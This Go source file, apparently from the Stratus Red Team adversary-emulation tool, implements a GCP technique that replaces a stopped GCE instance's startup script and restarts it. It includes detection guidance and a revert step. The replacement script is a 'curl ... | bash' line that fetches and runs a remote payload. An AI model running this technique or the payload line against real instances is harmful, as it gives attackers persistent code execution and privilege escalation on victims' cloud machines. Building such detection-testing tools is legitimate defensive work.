package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"time"

	compute "cloud.google.com/go/compute/apiv1"
	"cloud.google.com/go/compute/apiv1/computepb"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const (
	legitimateStartupScript = "#!/bin/bash\necho 'Legitimate startup script'"
	maliciousStartupScript  = "#!/bin/bash\ncurl -s https://stratus-red-team.cloud/payload.sh | bash"
)

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.execution.modify-gce-startup-script",
		FriendlyName: "Modify a GCE Instance Startup Script",
		Description: `
Modifies the startup script of a stopped GCE instance to execute an attacker-controlled
payload on the next boot. An attacker with <code>compute.instances.setMetadata</code>
permission can use this technique to achieve persistent code execution and privilege
escalation through the instance's service account, without needing direct access to
the instance.

Warm-up:

- Create a GCE instance (<code>e2-micro</code>, us-central1-a) with a benign startup script

Detonation:

- Stop the GCE instance and wait for it to reach <code>TERMINATED</code> state
- Replace the <code>startup-script</code> metadata value with a command that fetches
  and executes a remote payload
- Restart the instance

Revert:

- Stop the instance
- Restore the original <code>startup-script</code> metadata value
- Restart the instance

References:

- https://cloud.google.com/compute/docs/instances/startup-scripts/linux
- https://cloud.google.com/compute/docs/reference/rest/v1/instances/setMetadata
- https://unit42.paloaltonetworks.com/cloud-virtual-machine-attack-vectors/
- https://about.gitlab.com/blog/plundering-gcp-escalating-privileges-in-google-cloud-platform/
`,
		Detection: `
Identify when a GCE instance's startup script is modified by monitoring for
<code>v1.compute.instances.setMetadata</code> events in GCP Admin Activity audit logs
where the <code>metadata.items</code> field contains a <code>startup-script</code> key
that points to an external URL or contains suspicious commands. Correlate with
preceding <code>v1.compute.instances.stop</code> events on the same instance.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newInstancesClient(ctx context.Context, providers stratus.CloudProviders) (*compute.InstancesClient, error) {
	client, err := compute.NewInstancesRESTClient(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Compute instances client: %w", err)
	}
	return client, nil
}

// waitForInstanceStatus polls until the instance reaches the desired status.
func waitForInstanceStatus(
	ctx context.Context,
	client *compute.InstancesClient,
	projectId, zone, instanceName, desiredStatus string,
) error {
	const maxAttempts = 60
	const pollInterval = 10 * time.Second

	for attempt := 0; attempt < maxAttempts; attempt++ {
		instance, err := client.Get(ctx, &computepb.GetInstanceRequest{
			Project:  projectId,
			Zone:     zone,
			Instance: instanceName,
		})
		if err != nil {
			return fmt.Errorf("failed to get instance %s status: %w", instanceName, err)
		}
		if instance.GetStatus() == desiredStatus {
			return nil
		}
		log.Printf("Waiting for instance %s to reach %s (current: %s, attempt %d/%d)\n",
			instanceName, desiredStatus, instance.GetStatus(), attempt+1, maxAttempts)
		time.Sleep(pollInterval)
	}
	return fmt.Errorf("instance %s did not reach status %s after %d attempts", instanceName, desiredStatus, maxAttempts)
}

// setStartupScript stops the instance, replaces its startup-script metadata,
// then starts it again.
func setStartupScript(
	ctx context.Context,
	client *compute.InstancesClient,
	projectId, zone, instanceName, script string,
) error {
	log.Printf("Stopping instance %s\n", instanceName)
	stopOp, err := client.Stop(ctx, &computepb.StopInstanceRequest{
		Project:  projectId,
		Zone:     zone,
		Instance: instanceName,
	})
	if err != nil {
		return fmt.Errorf("failed to stop instance %s: %w", instanceName, err)
	}

	if err = stopOp.Wait(ctx); err != nil {
		return fmt.Errorf("failed waiting for instance %s to stop: %w", instanceName, err)
	}

	// The operation completing does not guarantee the instance is TERMINATED —
	// poll until the status is confirmed before calling SetMetadata.
	if err = waitForInstanceStatus(ctx, client, projectId, zone, instanceName, "TERMINATED"); err != nil {
		return err
	}

	// Fetch the current metadata fingerprint; SetMetadata requires it to
	// prevent lost-update races.
	instance, err := client.Get(ctx, &computepb.GetInstanceRequest{
		Project:  projectId,
		Zone:     zone,
		Instance: instanceName,
	})
	if err != nil {
		return fmt.Errorf("failed to get instance %s metadata: %w", instanceName, err)
	}

	log.Printf("Setting startup-script on instance %s\n", instanceName)
	setMetaOp, err := client.SetMetadata(ctx, &computepb.SetMetadataInstanceRequest{
		Project:  projectId,
		Zone:     zone,
		Instance: instanceName,
		MetadataResource: &computepb.Metadata{
			Fingerprint: instance.GetMetadata().Fingerprint,
			Items: []*computepb.Items{
				{
					Key:   ptr("startup-script"),
					Value: ptr(script),
				},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("failed to set metadata on instance %s: %w", instanceName, err)
	}

	if err = setMetaOp.Wait(ctx); err != nil {
		return fmt.Errorf("failed waiting for SetMetadata on instance %s: %w", instanceName, err)
	}

	log.Printf("Starting instance %s\n", instanceName)
	startOp, err := client.Start(ctx, &computepb.StartInstanceRequest{
		Project:  projectId,
		Zone:     zone,
		Instance: instanceName,
	})
	if err != nil {
		return fmt.Errorf("failed to start instance %s: %w", instanceName, err)
	}

	if err = startOp.Wait(ctx); err != nil {
		return fmt.Errorf("failed waiting for instance %s to start: %w", instanceName, err)
	}

	return nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	instanceName := params["instance_name"]
	zone := params["zone"]
	ctx := context.Background()

	client, err := newInstancesClient(ctx, providers)
	if err != nil {
		return err
	}
	defer client.Close()

	log.Printf("Replacing startup script on GCE instance %s with a remote payload fetcher\n", instanceName)
	if err = setStartupScript(ctx, client, projectId, zone, instanceName, maliciousStartupScript); err != nil {
		return err
	}

	log.Printf("Successfully replaced startup script on instance %s — malicious payload will execute on next boot\n", instanceName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	instanceName := params["instance_name"]
	zone := params["zone"]
	ctx := context.Background()

	client, err := newInstancesClient(ctx, providers)
	if err != nil {
		return err
	}
	defer client.Close()

	log.Printf("Restoring original startup script on GCE instance %s\n", instanceName)
	if err = setStartupScript(ctx, client, projectId, zone, instanceName, legitimateStartupScript); err != nil {
		return err
	}

	log.Printf("Successfully restored original startup script on instance %s\n", instanceName)
	return nil
}

func ptr[T any](v T) *T {
	return &v
}
